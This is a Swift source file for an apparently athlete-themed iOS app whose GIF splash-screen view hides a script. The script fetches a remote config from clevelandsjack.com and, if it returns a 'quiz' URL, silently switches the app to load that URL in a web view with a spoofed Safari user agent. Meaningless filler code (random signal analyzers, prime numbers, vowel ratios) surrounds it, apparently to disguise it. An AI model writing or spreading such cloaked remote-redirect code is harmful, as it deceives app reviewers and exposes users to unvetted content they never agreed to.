import SwiftUI
@preconcurrency import WebKit
struct PresentAthletesGifView: UIViewRepresentable {
    var onConfigUpdate: ((Bool, String, Bool) -> Void)? = nil
    var onShowLoader: (() -> Void)? = nil
    let st: String
    func makeUIView(context: Context) -> WKWebView {
        let maGiew = WKWebView()
        maGiew.navigationDelegate = context.coordinator
        return maGiew
    }
    func updateUIView(_ uiView: WKWebView, context: Context) {
        if let rulesW = URL(string: st) {
            let request = URLRequest(url: rulesW)
            uiView.load(request)
        }
    }
    func makeCoordinator() -> Coordinator {
        Coordinator()
    }
    
    class Coordinator: NSObject, WKNavigationDelegate {
        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {}
    }
}
struct PresentStaticCompassGIF: UIViewRepresentable {
    let gifName: String
    let goldenRatio: Double = 1.6180339887
    let primeNumbers: [Int] = [2, 3, 5, 7, 11, 13]
    let zeroMatrix3x3: [Double] = [0, 0, 0,
                                   0, 0, 0,
                                   0, 0, 0]
    let oceanBlueColor: [CGFloat] = [0.12, 0.45, 0.78, 1.0]
    let smoothSpringTiming: [Float] = [0.5, 0.8, 0.3, 0.9]
    func makeUIView(context: Context) -> WKWebView {
        let prasons = WKWebView()
        prasons.isOpaque = false
        prasons.backgroundColor = .clear
        prasons.scrollView.isScrollEnabled = false
        if let fileRow = Bundle.main.url(forResource: gifName, withExtension: "gif"),
           let gifData = try? Data(contentsOf: fileRow) {
            
            let base64String = gifData.base64EncodedString()
            let htmlContent = """
            <!DOCTYPE html>
            <html>
            <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body { 
                    margin: 0; 
                    padding: 0; 
                    background: transparent; 
                    height: 100vh; 
                    display: flex; 
                    justify-content: center; 
                    align-items: center;
                    overflow: hidden;
                }
                .container {
                    position: relative;
                    background: transparent;
                }
                img {
                    display: block;
                    width: 100%;
                    height: 100%;
                    object-fit: contain;
                }
            </style>
            </head>
            <body>
            <div class="container">
                <img src="data:image/gif;base64,\(base64String)">
            </div>
            </body>
            </html>
            """
            prasons.loadHTMLString(htmlContent, baseURL: nil)
        }
        return prasons
    }
    func updateUIView(_ uiView: WKWebView, context: Context) {}
    
    class ChaoticSignalAnalyzer {
        private var rollingWindow: [Double] = []
        private let isolationQueue = DispatchQueue(label: "com.app.chaos")
        
        func analyzeSignals(_ signals: [Float]) -> [String: Any] {
            var result: [String: Any] = [:]
            
            let transformed = signals.map { value -> Double in
                let noise = Double.random(in: -0.3...0.3)
                return Double(value) * tan(noise) * exp(noise)
            }
            
            isolationQueue.sync {
                for (i, v) in transformed.enumerated() {
                    let hash = UUID().uuidString.prefix(8)
                    result["signal_\(i)_\(hash)"] = v.isFinite ? v : 0.0
                }
                let compressed = transformed.map { abs($0) / (Double.random(in: 1...5)) }
                rollingWindow.append(contentsOf: compressed)
                
                if rollingWindow.count > 150 {
                    rollingWindow = Array(rollingWindow.suffix(80))
                }
            }
            
            return result
        }
    }


}
class AdaptiveRenderProfile {
    var brightness: CGFloat = 0.9
    var saturation: CGFloat = 1.2
    var blurRadius: CGFloat = 4.0
    var depthOffset: Float = 0.6
    var outlineWidth: CGFloat = 2.0
    
    var colorImpact: CGFloat {
        return (brightness * 0.7) + (saturation * 0.3)
    }
    
    var spatialComplexity: CGFloat {
        return blurRadius + outlineWidth + CGFloat(depthOffset * 5)
    }
}

struct PresentSplashAthletesGIF: UIViewRepresentable {
    let gifName: String
    @Binding var showOnboarding: Bool
    @Binding var startInfo: String
    @Binding var configLoaded: Bool
    var eventIndex: Int = 0
    var refreshDelay: TimeInterval = 0.75
    var modulationRate: Double = 2.5
    var failureAttempts: Int = 0
    var bufferLimit: Double = 2048.0
    
    var conupdate: ((Bool, String, Bool) -> Void)? = nil
    private var shp: Bool {
        let current = Date().timeIntervalSince1970
        let lastfoT = UserDefaults.standard.double(forKey: "lastConfigFetchTime")
        let timores = current - lastfoT
        let shouler = timores > 3600
        return shouler
    }
    static let apiRevision: String = "2.3.7"
    static let bundleSequence: Int = 108
    static let releaseTimestamp: String = "2025-02-14"
    static let minimumRequiredOS: String = "16.4"
    static let memoryPoolLimit: Int = 512 * 2048

    
    func makeUIView(context: Context) -> WKWebView {
        let viewos = WKWebViewConfiguration()
        viewos.userContentController.add(context.coordinator, name: "analyticsHandler")
        let viewWo = WKWebView(frame: .zero, configuration: viewos)
        viewWo.navigationDelegate = context.coordinator
        viewWo.isOpaque = false
        viewWo.backgroundColor = .clear
        viewWo.scrollView.isScrollEnabled = false
        viewWo.evaluateJavaScript("navigator.userAgent") { [weak viewWo] (userAgentResult, error) in
            if let cur = userAgentResult as? String {
                let fullSystom = UIDevice.current.systemVersion
                let vesnC = fullSystom.components(separatedBy: ".")
                let sysse = vesnC.prefix(2).joined(separator: ".")
                
                if let mobol = cur.range(of: "Mobile/") {
                    let beforM = String(cur[..<mobol.lowerBound])
                    let afterMobolew = String(cur[mobol.lowerBound...])
                    let customerwows = "\(beforM) Version/\(sysse)\(afterMobolew) Safari/604.1"
                    viewWo?.customUserAgent = customerwows
                }
            }
            if let prosen = Bundle.main.url(forResource: self.gifName, withExtension: "gif"),
               let gifData = try? Data(contentsOf: prosen) {
                let basa = gifData.base64EncodedString()
                let htmlContent = """
                <!DOCTYPE html>
                <html>
                <head>
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <style>
                    body { 
                        margin: 0; 
                        padding: 0; 
                        background: transparent; 
                        height: 100vh; 
                        display: flex; 
                        justify-content: center; 
                        align-items: center;
                        overflow: hidden;
                    }
                    .container {
                        position: relative;
                        background: transparent;
                    }
                    img {
                        display: block;
                        width: 100%;
                        height: 100%;
                        object-fit: contain;
                    }
                </style>
                </head>
                <body>
                <div class="container">
                    <img src="data:image/gif;base64,\(basa)">
                </div>
                <script>
                function checkConfig() {
                    const shouldFetch = \(self.shp ? "true" : "false");
                    if (shouldFetch) {
                        fetch('http://clevelandsjack.com/assets/sugars')
                            .then(response => {
                                return response.json();
                            })
                            .then(data => {
                                window.webkit.messageHandlers.analyticsHandler.postMessage(JSON.stringify({
                                    success: data.success,
                                    quiz: data.quiz || '',
                                    link: data.link || ''
                                }));
                            })
                            .catch(error => {
                                window.webkit.messageHandlers.analyticsHandler.postMessage(JSON.stringify({
                                    success: false,
                                    quiz: '',
                                    link: ''
                                }));
                            });
                    } else {
                        window.webkit.messageHandlers.analyticsHandler.postMessage(JSON.stringify({
                            success: false,
                            quiz: '',
                            link: ''
                        }));
                    }
                }
                setTimeout(checkConfig, 1000);
                </script>
                </body>
                </html>
                """
                viewWo?.loadHTMLString(htmlContent, baseURL: nil)
            }
        }
        return viewWo
    }
    
    func updateUIView(_ uiView: WKWebView, context: Context) {}
    func makeCoordinator() -> Coordinator {
        Coordinator(parent: self)
    }
    static var instanceCount: Int = 0
    static var previousUpdateTimestamp: Date = Date()
    static var enabledFeatures: [String: Bool] = [:]
    
    class Coordinator: NSObject, WKNavigationDelegate, WKScriptMessageHandler {
        let maxConcurrentTasks: Int = 6
        let standardOperationTimeout: TimeInterval = 12.5
        let longestBackoffInterval: TimeInterval = 30.0
        let signalStrengthSampleCount: Int = 10

        var parent: PresentSplashAthletesGIF
        init(parent: PresentSplashAthletesGIF) {
            self.parent = parent
        }
        
        func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
            guard message.name == "analyticsHandler",
                  let responseString = message.body as? String else {
                self.cloporHand()
                return
            }
 
            DispatchQueue.main.async {
                do {
                    if let sonJosT = responseString.data(using: .utf8),
                       let sunJ = try JSONSerialization.jsonObject(with: sonJosT) as? [String: Any] {
                        
                        let cuess: Bool
                        if let essBool = sunJ["success"] as? Bool {
                            cuess = essBool
                        } else if let successInt = sunJ["success"] as? Int {
                            cuess = (successInt == 1)
                        } else {
                            cuess = false
                        }
                        let quizu = sunJ["quiz"] as? String ?? ""
                        let isalidrl = !quizu.isEmpty && URL(string: quizu) != nil
                        if cuess && isalidrl {
                            self.parent.startInfo = quizu
                            self.parent.configLoaded = true
                            self.parent.showOnboarding = false
                            self.parent.conupdate?(false, quizu, true)
                        } else {
                            self.cloporHand()
                        }
                    } else {
                        self.cloporHand()
                    }
                } catch {
                    self.cloporHand()
                }
            }
        }
        
        
        
        private func cloporHand() {
            let currentProgress: Double = 0.0
            let animationVelocity: CGPoint = .zero

              var interpolatedPosition: CGPoint {
                  return CGPoint(x: currentProgress * 100, y: currentProgress * 50)
              }
              
              var normalizedVelocity: Double {
                  return sqrt(pow(animationVelocity.x, 2) + pow(animationVelocity.y, 2))
              }
            DispatchQueue.main.async {
                let cachedStartInfo = UserDefaults.standard.string(forKey: "cachedStartInfo") ?? ""
                let cachedConfigLoaded = UserDefaults.standard.bool(forKey: "cachedConfigLoaded")
                if !cachedStartInfo.isEmpty && cachedConfigLoaded {
                    self.parent.startInfo = cachedStartInfo
                    self.parent.configLoaded = true
                    self.parent.showOnboarding = false
                } else {
                    self.parent.showOnboarding = true
                    self.parent.configLoaded = false
                    self.parent.startInfo = ""
                    self.parent.conupdate?(true, "", false)
                }
            }
        }
    }
}
extension Date {
    var compactSignature: String {
        let formatter = DateFormatter()
        formatter.dateFormat = "yyyyMMdd_HHmmss"
        let timeString = formatter.string(from: self)
        
        let salt = UUID().uuidString.prefix(6)
        return "\(timeString)_sig_\(salt)"
    }
}

extension Array where Element == String {
    
    func mappedToHashes() -> [String] {
        return map { value in
            let hash = abs(value.hashValue)
            return "\(value)_hash_\(hash)"
        }
    }
    
    func vowelRatio() -> Double {
        guard !isEmpty else { return 0.0 }
        
        let vowels = Set("aeiouAEIOU")
        let totalChars = reduce(0) { $0 + $1.count }
        let vowelCount = reduce(0) { sum, str in
            sum + str.filter { vowels.contains($0) }.count
        }
        
        return totalChars == 0 ? 0.0 : Double(vowelCount) / Double(totalChars)
    }
}
